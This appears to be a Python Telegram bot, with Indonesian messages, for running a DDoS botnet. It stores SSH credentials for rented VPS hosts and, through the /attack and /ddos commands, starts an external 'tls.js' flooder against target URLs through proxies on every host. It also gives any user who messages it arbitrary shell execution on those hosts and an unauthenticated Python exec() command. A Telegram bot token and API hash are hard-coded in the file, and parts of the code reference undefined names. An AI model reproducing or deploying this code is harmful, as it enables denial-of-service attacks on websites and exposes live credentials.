import sys
from pyrogram import Client, filters
import paramiko
import json
import os
import subprocess
import time
import subprocess
import validators
import threading
from pyrogram import Client, filters
from pyrogram.types import Message
from concurrent.futures import ThreadPoolExecutor
import psutil
from pyrogram import Client, filters
import speedtest

BOT_TOKEN = "7881482388:AAGp8gYPg6CJh_iXNtuGYeEin7EF0UpAOlg"
API_ID = 26323194          
API_HASH = "b85b75c7631c4aabc6084a2202952f67"    

VPS_FILE = "vps_list.json"


def execute_ssh_command(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)

        if command.startswith('apt'):
            command = f"echo {password} | sudo -S {command}"

        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"

def generate_screen_name(vps_list):
    last_screen_number = len(vps_list)
    return str(last_screen_number + 1) 

def create_new_screen_and_run_command(host, port, username, password, command, screen_number):
    try:
        screen_name = f"screen_{screen_number}"
        result = execute_ssh_command(host, port, username, password, f"screen -dmS {screen_name} {command}")
        verify_screen_command = execute_ssh_command(host, port, username, password, "screen -list")
        
        if screen_name in verify_screen_command:
            return f"Screen {host}:{port} berhasil dibuat dan perintah dijalankan."
        else:
            return f"Gagal membuat screen {screen_name} di {host}:{port}."
    except Exception as e:
        return f"Kesalahan saat membuat screen baru di {host}:{port} - {str(e)}"


def check_code_running(host, port, username, password):
    command = "ps aux"
    result = execute_ssh_command(host, port, username, password, command)
    keywords = [
        "python",        
        "python3",       
        "php",     
        "node",   
        "java",    
        "ruby",         
        "perl",        
        "c++",          
        "c",             
        "go",            
        "rust",        
        "html",         
        "css",           
        "javascript",    
        "bash",          
        "sh",         
        "swift",      
        "typescript",   
        "scala",      
        "kotlin",      
        "lua"            
    ]
    
    for keyword in keywords:
        if keyword in result:
            return True 
    return False 


def run_attack(urls):
    for url in urls:
        print(f"[INFO] Menyerang URL: {url}")
        while True:
            try:
                result = subprocess.run(
                    ["node", tls, url, "6000", "64", "10", proxy_file],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    print(f"[SUCCESS] {result.stdout.strip()}")
                else:
                    print(f"[ERROR] {result.stderr.strip()}")
                time.sleep(10)
            except KeyboardInterrupt:
                print("[INFO] Dihentikan oleh pengguna.")
                break
            except Exception as e:
                print(f"[ERROR] Kesalahan saat eksekusi: {e}")
                break


def load_vps():
    if not os.path.exists(VPS_FILE):
        return []
    with open(VPS_FILE, "r") as file:
        try:
            return json.load(file)
        except json.JSONDecodeError:
            return []

def save_vps(vps_list):
    with open(VPS_FILE, "w") as file:
        json.dump(vps_list, file, indent=4)

def execute_ssh_command(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)

        if command.startswith('apt'):
            command = f"echo {password} | sudo -S {command}"

        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"

def execute_shell_command(host, port, username, password, command):
    return execute_ssh_command(host, port, username, password, command)

def evaluate_python_code(code):
    try:
        exec_globals = {}
        exec(code, exec_globals)
        result = exec_globals.get("result", "No result returned.")
        return str(result)
    except Exception as e:
        return f"Error: {str(e)}"

def is_screen_session_active(host, port):
    session_name = f"vps_{host}_{port}"
    check_command = f"screen -ls | grep {session_name}"
    result = execute_ssh_command(host, port, username, password, check_command)
    return bool(result)

def execute_ssh_command_in_existing_screen(host, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        screen_command = f"screen -S existing_screen_name -X stuff '{command}\n'"
        stdin, stdout, stderr = ssh.exec_command(screen_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        return output if output else error
    except Exception as e:
        return f"Error: {str(e)}"


app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)


tls_script = 'tls.js'
proxy_file = 'proxy.txt'

if not os.path.isfile(tls_script):
    raise FileNotFoundError(f"Error: File {tls_script} tidak ditemukan.")

if not os.path.isfile(proxy_file):
    raise FileNotFoundError(f"Error: File {proxy_file} tidak ditemukan.")


with open('vps_list.json') as f:
    vps_list = json.load(f)
 

successful = 0
failed = 0
successful_lock = threading.Lock()
failed_lock = threading.Lock()

def increment_counter(counter_type):
    global successful, failed
    if counter_type == 'success':
        with successful_lock:
            successful += 1
    elif counter_type == 'fail':
        with failed_lock:
            failed += 1

def get_vps_status(vps):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["host"], username=vps["username"], password=vps["password"], port=vps["port"])
        stdin, stdout, stderr = client.exec_command("top -b -n1 | grep Cpu")
        cpu_usage = stdout.read().decode().strip()
        stdin, stdout, stderr = client.exec_command("free -m")
        mem_usage = stdout.read().decode().strip()
        stdin, stdout, stderr = client.exec_command("vnstat --json")
        bandwidth_usage = stdout.read().decode().strip()

        client.close()
        cpu_percent = cpu_usage.split(",")[0].split(":")[1].strip()
        total_mem, used_mem, free_mem = mem_usage.split("\n")[1].split()[1:4]
        total_bandwidth = json.loads(bandwidth_usage)["interfaces"][0]["traffic"]["total"]["rx_bytes"] + \
                          json.loads(bandwidth_usage)["interfaces"][0]["traffic"]["total"]["tx_bytes"]

        return {
            "cpu_percent": cpu_percent,
            "total_mem": total_mem,
            "used_mem": used_mem,
            "free_mem": free_mem,
            "total_bandwidth": total_bandwidth
        }
    except Exception as e:
        return f"Gagal mengakses {vps['host']}: 🔴 Dead"
    
def check_cpu_on_vps(vps):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['host'], port=vps['port'], username=vps['username'], password=vps['password'], timeout=5)
        stdin, stdout, stderr = ssh.exec_command(
            "top -bn1 | grep 'Cpu(s)' | sed \"s/.*, *\\([0-9.]*\\)%* id.*/\\1/\" | awk '{print 100 - $1}'", 
            timeout=5
        )
        output = stdout.read().decode().strip()
        ssh.close()

        if output:
            status_cpu = output
            status = "🟢 Alive"
        else:
            status_cpu = "N/A"
            status = "🔴 Dead"

        return f"🖥️ Server ({vps['host']}): {status_cpu}% {status}"
    except Exception:
        return f"🖥️ Server ({vps['host']}): 🔴 Mokad"

@app.on_message(filters.command("exe") & filters.private)
async def handle_exe_command(message):
    if await message.from_user.id not in admin_id:
        return await message.reply("You are not authorized to use this command.")

    command = message.text[5:]
    if not command:
        return await message.reply("Please provide a command to execute.")

    results = [None] * len(vps_list)
    threads = []

    global successful, failed
    successful = 0
    failed = 0

    for i, vps in enumerate(vps_list):
        thread = threading.Thread(target=execute_command_on_vps, args=(vps, command, results, i))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    response_message = f"Berhasil: {successful}\nGagal: {failed}"
    return await message.reply(response_message)

#@app.on_message(filters.command("cpu") & filters.private)
async def check_all_vps(client, message):
    vps_list = load_vps()
    response = "💻 **Status Semua VPS**\n\n"

    for vps in vps_list:
        response += f"🔧 **{vps['host']}**:\n"
        status = get_vps_status(vps)

        if isinstance(status, dict):
            response += (f"⚙️ **CPU Usage**: {status['cpu_percent']}%\n"
                         f"💾 **Total Memory**: {status['total_mem']} MB\n"
                         f"📉 **Used Memory**: {status['used_mem']} MB\n"
                         f"📈 **Free Memory**: {status['free_mem']} MB\n"
                         f"🌐 **Total Bandwidth Usage**: {status['total_bandwidth']} bytes\n\n")
        else:
            response += status + "\n\n"

    await message.reply_text(response)

@app.on_message(filters.command("cpu") & filters.private)
async def handle_cpu_command(client, message):
    pros = await message.reply("Checking VPS...")
    vps_list = load_vps()
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(check_cpu_on_vps, vps_list))
    response_message = "\n".join(results)
    await pros.edit(response_message)
    return 
def execute_command_on_vps(vps, command, results, index):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['IP'], port=vps['port'], username=vps['username'], password=vps['password'], timeout=5)
        stdin, stdout, stderr = ssh.exec_command(command, timeout=5)
        stdout.read().decode() 
        stderr.read().decode()  
        ssh.close()
        increment_counter('success')
    except Exception:
        increment_counter('fail')


@app.on_message(filters.command("attack"))
async def handle_attack(client, message):
    await message.reply("otw bosq")
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return await message.reply("Usage: /attack [URL]")

    url_input = args[1]
    urls = [url.strip() for url in url_input.split(",")]

    valid_urls = []
    for url in urls:
        if validators.url(url):
            valid_urls.append(url)
        else:
            await message.reply(f"[SKIP] URL tidak valid: {url}")

    if not valid_urls:
        return await message.reply("Tidak ada URL yang valid. Serangan dihentikan.")
    try:
        run_attack(valid_urls)
        await message.reply(f"[INFO] Serangan dimulai pada URL: {', '.join(valid_urls)}")
    except Exception as e:
        await message.reply(f"[ERROR] Terjadi kesalahan: {e}")



@app.on_message(filters.command("addvps"))
async def add_vps(client, message):
    asu = await message.reply("otw addvps")
    try:
        _, host, port, username, password = message.text.split(maxsplit=4)
        port = int(port)
        vps_list = load_vps()
        for vps in vps_list:
            if vps["host"] == host and vps["port"] == port:
                await asu.edit("VPS ini sudah terdaftar.")
                return
        vps_list.append({"host": host, "port": port, "username": username, "password": password})
        save_vps(vps_list)
        await asu.edit("VPS berhasil ditambahkan!")
    except ValueError:
        return await asu.edit("Gunakan format: /addvps [host] [port] [username] [password]")


@app.on_message(filters.command("delvps"))
async def del_vps(client, message):
    try:
        _, host, port = message.text.split(maxsplit=2)
        port = int(port)
        vps_list = load_vps()
        for vps in vps_list:
            if vps["host"] == host and vps["port"] == port:
                vps_list.remove(vps)
                save_vps(vps_list)
                await message.reply(f"VPS {host}:{port} berhasil dihapus!")
                return

        await message.reply("VPS tidak ditemukan dalam daftar.")
    except ValueError:
        await message.reply("Gunakan format: /delvps [host] [port]")
        return 


@app.on_message(filters.command("listvps"))
async def list_vps(client, message):
    memek = await message.reply("otw cek vps")
    vps_list = load_vps()
    if vps_list:
        reply = "Daftar VPS yang terhubung:\n"
        for vps in vps_list:
            is_running = check_code_running(vps['host'], vps['port'], vps['username'], vps['password'])
            status = "Sedang berjalan" if is_running else "Tidak berjalan"
            reply += f"- {vps['host']}:{vps['port']} (user: {vps['username']}) - {status}\n"
        await memek.edit(reply)
    else:
        await memek.edit("Tidak ada VPS yang terdaftar.")


@app.on_message(filters.command("bot"))
async def bot_command(client, message):
    try:
        command = message.text.split(" ", 1)[1]
        vps_list = load_vps()

        if not vps_list:
            await message.reply("Tidak ada VPS yang terdaftar.")
            return
        results = []

        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            result = execute_ssh_command(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port}:\n{result}")
        await message.reply("\n\n".join(results))

    except IndexError:
        await message.reply("Gunakan format: /bot command")

@app.on_message(filters.command("ddos"))
async def bot_command(client, message):
    asu = await message.reply("otw ddos tunggu bentar")
    try:
        command = message.text.split(" ", 1)[1]
        vps_list = load_vps()

        if not vps_list:
            await message.edit("tidak ada vps yang terdaftar")
            return

        results = []
        screen_number = 1

        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            
            result = execute_ssh_command_in_existing_screen(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port}:\n{result}")
            new_screen_result = create_new_screen_and_run_command(host, port, username, password, command, screen_number)
            results.append(f"Perintah dijalankan di screen baru di VPS {host}:{port} dengan nama screen screen_{screen_number}:\n{new_screen_result}")
            
            screen_number += 1
        
        await asu.edit("done sekarang lu bisa ddos orang lain lagi")

    except IndexError:
        return await asu.edit("gunakan format /ddos command")

@app.on_message(filters.command("stop"))
async def mokad(client, message):
    memek = await message.reply("otw berhenti ddos")

    def kill_screen_on_vps(vps):
        try:
            host, port, username, password = vps["host"], vps["port"], vps["username"], vps["password"]
            result = execute_ssh_command(host, port, username, password, "killall screen")
            
            if "not found" in result.lower():
                return f"Tidak ada sesi screen yang ditemukan di {host}:{port}."
            else:
                return f"[SUCCESS] Semua sesi screen dihentikan di {host}:{port}."
        except Exception as e:
            return f"Kesalahan di {vps['host']}:{vps['port']} - {str(e)}"

    kill_responses = []
    ddos_responses = []
    screen_number = 1
    
    for vps in vps_list:
        kill_responses.append(kill_screen_on_vps(vps))
        ddos_responses.append(create_new_screen_and_run_command(vps['host'], vps['port'], vps['username'], vps['password'], "node tls.js", screen_number))
        screen_number += 1 
    
    result_message = "\n".join(kill_responses) + "\n\n" + "\n".join(ddos_responses)
    await memek.edit(f"[INFO] Hasil perintah stop dan restart:\n{result_message}")

@app.on_message(filters.command("lihat"))
async def shell(client, message):
    await message.reply("otw bosq")
    try:
        _, host, command = message.text.split(maxsplit=2)
        vps_list = load_vps()
        vps = next((v for v in vps_list if v['host'] == host), None)
        
        if not vps:
            await message.edit(f"VPS dengan IP {host} tidak terdaftar.")
            return
        port = vps['port']
        username = vps['username']
        password = vps['password']
        result = execute_ssh_command(host, port, username, password, command)
        await message.edit(f"Hasil perintah di VPS {host}:{port}:\n{result}")
    
    except ValueError:
        await message.edit("Gunakan format: /lihat [host] [command]")


@app.on_message(filters.command("lihatall"))
async def shell(client, message):
    try:
        _, command = message.text.split(maxsplit=1)
        vps_list = load_vps()
        
        if not vps_list:
            await message.reply("Tidak ada VPS yang terdaftar.")
            return
        results = []
        
        for vps in vps_list:
            host = vps['host']
            port = vps['port']
            username = vps['username']
            password = vps['password']
            result = execute_ssh_command_in_screen(host, port, username, password, command)
            results.append(f"Hasil perintah di VPS {host}:{port} (dalam screen):\n{result}")
        await message.reply("\n\n".join(results))
    
    except ValueError:
        await message.reply("Gunakan format: /shell [command]")




@app.on_message(filters.command("eval"))
async def eval_code(client, message):
    try:
        code = message.text.split(" ", 1)[1]
        result = evaluate_python_code(code)
        await message.reply(f"Hasil evaluasi:\n{result}")
    except IndexError:
        await message.reply("Gunakan format: /eval [code]")


@app.on_message(filters.command("help"))
async def help(client, message):
    helpss = """
/addvps tambah vps
/listvps daftar vps
/delvps hapus vps
/ddos ya ddos
/attack ya attack
"""

    return await message.reply(helpss)


if __name__ == "__main__":
    print("Bot sudah berjalan... Kirimkan perintah ke bot untuk memulai.")
    app.run()
